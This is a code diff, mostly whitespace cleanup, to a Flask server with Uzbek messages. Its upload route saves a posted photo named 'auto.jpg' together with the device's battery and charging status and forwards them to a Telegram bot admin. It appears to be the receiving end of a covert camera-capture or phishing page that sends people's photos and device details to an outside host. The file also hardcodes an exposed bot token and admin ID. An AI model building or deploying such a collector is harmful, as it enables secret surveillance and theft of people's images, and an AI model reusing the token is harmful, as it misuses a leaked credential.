@@ -4,8 +4,8 @@ import requests
 
 app = Flask(__name__)
 
-BOT_TOKEN = '8452173172:AAEEPUQuzOrMta1Pz1Nf1mvmSQr20CFhA3U' 
-ADMIN_ID = 7962350864   
+BOT_TOKEN = '8452173172:AAEEPUQuzOrMta1Pz1Nf1mvmSQr20CFhA3U'
+ADMIN_ID = 7962350864
 
 @app.route('/')
 def index():
@@ -25,7 +25,7 @@ def upload():
     photo_path = 'auto.jpg'
     photo.save(photo_path)
 
-     # battery_level ni raqamga aylantirish
+    # battery_level ni raqamga aylantirish
     try:
         battery_percent = int(float(battery_level) * 100)
     except (ValueError, TypeError):
@@ -33,7 +33,7 @@ def upload():
 
     send_photo_url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto'
 
-     caption_text = (
+    caption_text = (
         "📸 Yangi rasm!\n"
         f"🔋 Zaryad: {battery_percent if battery_percent != 'Nomalum' else 'Nomalum'}%, "
         f"Quvvat olayapti: {battery_charging}\n"
@@ -47,9 +47,8 @@ def upload():
         }, files={'photo': f})
 
     os.remove(photo_path)
-
     return 'Yuborildi', 200
+
 
 if __name__ == '__main__':
     app.run(debug=True, host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
-
